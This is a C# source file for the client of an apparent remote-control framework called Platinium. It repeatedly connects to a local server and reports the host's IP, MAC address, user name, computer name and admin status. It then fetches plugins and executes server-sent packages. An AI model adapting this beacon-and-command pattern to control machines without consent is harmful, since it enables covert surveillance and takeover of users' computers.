using Platinium.Shared.Content;
using Platinium.Shared.Core;
using Platinium.Shared.Data.Packages;
using Platinium.Shared.Data.Serialization;
using Platinium.Shared.Info;
using System;
using System.Management;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.IO;
using System.Configuration;
using Platinium.Shared.Data.Network;
using Platinium.Shared.Data.Structures;

namespace Platinium
{
    namespace Entities
    {
        class PlatiniumClient
        {
            private ClientInfo ClientInfo = BuildClientInfo();
            private TcpClient clientSocket = new TcpClient();
            private static bool isConnected = false;
            private PackageFactory PFactory;
            public PlatiniumClient()
            {
                Console.Title = "Platinium Beta Client";
                Initialize();
            }
            private void Initialize()
            {
                while (true)
                {
                    if (!isConnected)
                    {
                        try
                        {
                            clientSocket = new TcpClient();
                            clientSocket.Connect(new IPEndPoint(IPAddress.Parse("127.0.0.1"), 55555));
                            PFactory = new PackageFactory(this);
                            DataStructure.Info = ClientInfo;
                            Write(new Package(null, ClientInfo, PackageType.Base, ClientInfo, new ClientInfo(BaseInfoType.Server), null));
                            Thread GetThread = new Thread(Get);
                            GetThread.Start();
                            LoadPlugins();
                            isConnected = true;
                        }
                        catch (Exception) { }
                    }
                }
            }
            private void LoadPlugins()
            {
                Console.WriteLine("DOWNLOADING PLUGINS");
                Write(new Package("LOAD_PLUGINS", null, PackageType.Data, ClientInfo, new ClientInfo(BaseInfoType.Server), null));
            }
            private void Write(Package package)
            {
                try
                {
                    NetworkManagement.WriteData(clientSocket, package);
                }
                catch (Exception) { isConnected = false; }
            }
            private void Get()
            {
                while (true)
                {
                    Package package;
                    try
                    {
                        package = NetworkManagement.ReadData(clientSocket);
                    }
                    catch (Exception) { isConnected = false; break; }
                    Console.WriteLine(package.Content.NULLIfNull());
                    Console.WriteLine(package.PackageType.ToString());
                    if (!DataStructure.PackageStatus.ContainsKey(package.ID))
                    {
                        DataStructure.PackageStatus.Add(package.ID, false);
                    }
                    Package responsePackage = PFactory.HandleClientPackages(package);
                    Write(responsePackage);
                    Console.WriteLine("GET");
                }
                Thread.CurrentThread.Abort();
            }
            private static ClientInfo BuildClientInfo()
            {
                ClientInfo ci = new ClientInfo
                {
                    IP = DeviceInfo.GetPublicIP(),
                    MACAddress = DeviceInfo.GetMacAddress(),
                    UserName = DeviceInfo.GetCurrentLoggedUser(),
                    ComputerName = DeviceInfo.GetComputerName(),
                    UID = FingerPrint.Value(),
                    Type = BaseInfoType.Client,
                    IsAdministrator = DeviceInfo.IsAdministrator(),
                    Language = DeviceInfo.GetCurrentCulture(),
                    AppNetVersion = DeviceInfo.GetAppNetVersion(),
                    OSName = DeviceInfo.GetOSName()
                };
                return ci;
            }
        }
    }
}
